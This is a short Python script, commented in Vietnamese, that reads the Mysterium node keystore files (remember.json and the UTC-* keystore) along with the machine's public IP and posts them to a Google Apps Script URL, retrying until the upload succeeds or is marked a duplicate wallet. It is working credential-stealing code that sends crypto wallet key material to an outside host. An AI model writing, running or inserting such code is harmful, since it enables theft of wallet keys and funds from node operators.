import requests
import json
import time
import random
import glob

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzheORxCn8a9IksFzlH7OVWYu49zPv58lmmdY37MEtNzWJdgXlKhEnpIhSih1hgZhQvYQ/exec"

def get_public_ip():
    try:
        return requests.get("https://api4.ipify.org", timeout=5).text.strip()  # Chỉ lấy IPv4
    except Exception as e:
        print(f"❌ Lỗi lấy IP: {e}")
        return "Unknown"

def read_file(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            return file.read().strip()
    except Exception as e:
        print(f"❌ Lỗi đọc file {file_path}: {e}")
        return "Error reading file"

def get_utc_file():
    utc_files = glob.glob("/var/lib/mysterium-node/keystore/UTC-*")
    if utc_files:
        return read_file(utc_files[0])
    return "UTC file not found"

data = {
    "ip": get_public_ip(),
    "wallet": read_file("/var/lib/mysterium-node/keystore/remember.json"),
    "phase": get_utc_file()
}

max_retries = 5
for i in range(max_retries):
    try:
        response = requests.post(GOOGLE_SCRIPT_URL, json=data, timeout=10)
        print(f"🚀 Gửi dữ liệu lần {i + 1}: {response.text}")

        if "Success" in response.text or "Duplicate Wallet - Skipped" in response.text:
            break  # Không cần gửi lại nếu đã thành công hoặc bị trùng

    except Exception as e:
        print(f"❌ Lỗi gửi dữ liệu: {e}")

    time.sleep(random.uniform(1, 3))  # Chờ ngẫu nhiên 1-3 giây trước khi thử lại
